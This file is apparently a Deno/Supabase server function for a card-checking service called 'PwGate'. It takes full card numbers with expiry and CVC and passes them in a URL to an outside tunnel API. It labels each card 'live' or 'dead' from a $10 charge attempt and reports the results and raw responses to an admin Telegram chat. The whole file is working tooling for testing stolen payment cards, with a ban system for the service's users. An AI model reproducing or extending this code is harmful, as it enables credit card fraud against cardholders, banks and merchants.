import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_CHAT_ID = "8496943061";

const API_BASE_URL = "https://tba-bike-internet-different.trycloudflare.com/api";

// Extract smart human-readable message from formHTML or API message
const extractSmartMessage = (html: string, resultSuccess: number | undefined, apiMessage?: string): string => {
  // Priority 1: If API provides a direct message field, use it exactly
  if (apiMessage && typeof apiMessage === 'string' && apiMessage.trim().length > 0) {
    return apiMessage.trim();
  }
  
  if (!html) {
    return resultSuccess === 0 ? "Declined" : "Transaction processed";
  }
  
  const lowerHtml = html.toLowerCase();
  
  // Check for 3D Secure indicators
  if (lowerHtml.includes('3dsecure') || 
      lowerHtml.includes('3d secure') || 
      lowerHtml.includes('3ds') ||
      lowerHtml.includes('pareq') ||
      lowerHtml.includes('acsurl') ||
      lowerHtml.includes('authentication') ||
      lowerHtml.includes('verify-3ds') ||
      lowerHtml.includes('securecode') ||
      lowerHtml.includes('verified by visa') ||
      lowerHtml.includes('mastercard securecode') ||
      lowerHtml.includes('american express safekey')) {
    return "3D Secure authentication required";
  }
  
  // Check for common decline reasons
  if (lowerHtml.includes('insufficient funds') || lowerHtml.includes('nsf')) {
    return "Insufficient funds";
  }
  if (lowerHtml.includes('expired card') || lowerHtml.includes('card expired')) {
    return "Card expired";
  }
  if (lowerHtml.includes('invalid card') || lowerHtml.includes('card invalid')) {
    return "Invalid card number";
  }
  if (lowerHtml.includes('invalid cvv') || lowerHtml.includes('cvv mismatch') || lowerHtml.includes('cvc')) {
    return "Invalid security code";
  }
  if (lowerHtml.includes('do not honor') || lowerHtml.includes('do_not_honor')) {
    return "Card declined - Do not honor";
  }
  if (lowerHtml.includes('lost card') || lowerHtml.includes('stolen card')) {
    return "Card reported lost/stolen";
  }
  if (lowerHtml.includes('fraud') || lowerHtml.includes('suspected fraud')) {
    return "Fraud suspected";
  }
  if (lowerHtml.includes('limit exceeded') || lowerHtml.includes('exceeds limit')) {
    return "Transaction limit exceeded";
  }
  if (lowerHtml.includes('restricted card') || lowerHtml.includes('card restricted')) {
    return "Card restricted";
  }
  if (lowerHtml.includes('pickup card') || lowerHtml.includes('pick up card')) {
    return "Card pickup required";
  }
  if (lowerHtml.includes('declined') || lowerHtml.includes('denied') || lowerHtml.includes('rejected')) {
    return "Declined";
  }
  if (lowerHtml.includes('approved') || lowerHtml.includes('success') || lowerHtml.includes('charged')) {
    return "Approved";
  }
  if (lowerHtml.includes('pending') || lowerHtml.includes('processing')) {
    return "Processing";
  }
  
  // Fallback based on result success
  if (resultSuccess === 0) {
    return "Declined";
  } else if (resultSuccess !== undefined) {
    return "Charged successfully";
  }
  
  return "Transaction processed";
};

// Send debug to admin via Telegram
const sendAdminDebug = async (cc: string, status: string, rawResponse: string, smartMessage: string) => {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log('[PWGATE] No Telegram token - skipping admin debug');
    return;
  }
  
  try {
    // Mask card for display
    const parts = cc.split('|');
    const maskedCard = parts[0] ? 
      `${parts[0].slice(0, 6)}******${parts[0].slice(-4)}|${parts[1] || '**'}|${parts[2] || '**'}|***` : 
      'Invalid format';
    
    // Truncate raw response if too long
    const truncatedRaw = rawResponse.length > 3000 ? 
      rawResponse.substring(0, 3000) + '\n... [truncated]' : 
      rawResponse;
    
    const statusEmoji = status === 'live' ? '💳' : status === 'dead' ? '❌' : '❓';
    
    const message = `${statusEmoji} <b>PwGate Debug</b>\n\n` +
      `<b>Card:</b> <code>${maskedCard}</code>\n` +
      `<b>Status:</b> ${status.toUpperCase()}\n` +
      `<b>Message:</b> ${smartMessage}\n\n` +
      `<b>Raw Response:</b>\n<pre>${truncatedRaw.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>`;
    
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ADMIN_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
  } catch (error) {
    console.error('[PWGATE] Failed to send admin debug:', error);
  }
};

// Call the PwGate API
const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}`;
  
  console.log(`[PWGATE] Calling: ${apiUrl}`);
  
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 55000);
  
  try {
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: { 
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    const rawText = await response.text();
    console.log(`[PWGATE] Raw response length: ${rawText.length}`);
    
    if (!rawText || rawText.trim() === '') {
      return { status: 'unknown', message: 'Empty response', rawResponse: '' };
    }
    
    let apiStatus = 'unknown';
    let smartMessage = 'No response message';
    let resultSuccess: number | undefined;
    let formHTML = '';
    let directMessage: string | undefined;
    
    try {
      const json = JSON.parse(rawText);
      
      // Priority: Check for any message field (message, error.message, msg, error) - use exactly as-is
      if (json.message && typeof json.message === 'string') {
        directMessage = json.message;
      } else if (json.error?.message && typeof json.error.message === 'string') {
        directMessage = json.error.message;
      } else if (json.error && typeof json.error === 'string') {
        directMessage = json.error;
      } else if (json.msg && typeof json.msg === 'string') {
        directMessage = json.msg;
      }
      
      // Check result.success - if 0 then DECLINED, any other value is CHARGED
      if (json.result !== undefined) {
        resultSuccess = json.result.success;
        
        if (json.result.success === 0) {
          apiStatus = 'dead';
        } else {
          apiStatus = 'live';
        }
        
        // Get formHTML for smart message extraction
        if (json.result.secure && json.result.secure.formHTML) {
          formHTML = json.result.secure.formHTML;
        }
        
        // Use direct message exactly as-is if present, otherwise extract from formHTML
        smartMessage = directMessage || extractSmartMessage(formHTML, resultSuccess);
      } else {
        // Fallback: use direct message or detect from response
        if (directMessage) {
          smartMessage = directMessage;
          const lower = directMessage.toLowerCase();
          if (lower.includes('declined') || lower.includes('failed') || lower.includes('error') || lower.includes('invalid')) {
            apiStatus = 'dead';
          } else if (lower.includes('success') || lower.includes('charged') || lower.includes('approved')) {
            apiStatus = 'live';
          }
        } else {
          const fallbackMsg = rawText;
          const lower = String(fallbackMsg).toLowerCase();
          if (lower.includes('declined') || lower.includes('failed')) {
            apiStatus = 'dead';
            smartMessage = 'Declined';
          } else if (lower.includes('success') || lower.includes('charged')) {
            apiStatus = 'live';
            smartMessage = 'Approved';
          } else {
            smartMessage = extractSmartMessage(fallbackMsg, undefined);
          }
        }
      }
    } catch {
      // Non-JSON response
      const lower = rawText.toLowerCase();
      if (lower.includes('declined') || lower.includes('failed')) {
        apiStatus = 'dead';
        smartMessage = 'Declined';
      } else if (lower.includes('charged') || lower.includes('success')) {
        apiStatus = 'live';
        smartMessage = 'Approved';
      } else {
        smartMessage = 'Unable to parse response';
      }
    }
    
    return { status: apiStatus, message: smartMessage, rawResponse: rawText };
    
  } catch (error) {
    clearTimeout(timeoutId);
    const errMsg = error instanceof Error ? error.message : 'Error';
    console.error(`[PWGATE] Error: ${errMsg}`);
    return { status: 'unknown', message: 'Request timeout or error', rawResponse: errMsg };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { cc } = body;
    
    if (!cc) {
      return new Response(JSON.stringify({ error: 'Card required', computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Validate card format
    const parts = cc.split('|');
    if (parts.length < 4 || !parts[3] || parts[3].length < 3 || !/^\d+$/.test(parts[3])) {
      return new Response(JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }), 
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Start API call while auth happens in parallel
    const apiPromise = callApi(cc);

    // Verify auth
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }), 
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Check if banned
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }), 
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Wait for API result
    const result = await apiPromise;
    
    // Send debug to admin via Telegram (fire-and-forget)
    sendAdminDebug(cc, result.status, result.rawResponse, result.message).catch(() => {});
    
    return new Response(
      JSON.stringify({
        computedStatus: result.status,
        apiStatus: result.status === 'live' ? 'CHARGED' : result.status === 'dead' ? 'DECLINED' : 'UNKNOWN',
        apiMessage: result.message, // Smart human-readable message
        apiTotal: '$10.00',
        status: result.status,
        message: result.message,
        // rawResponse intentionally excluded from user response
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, computedStatus: "unknown" }), 
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});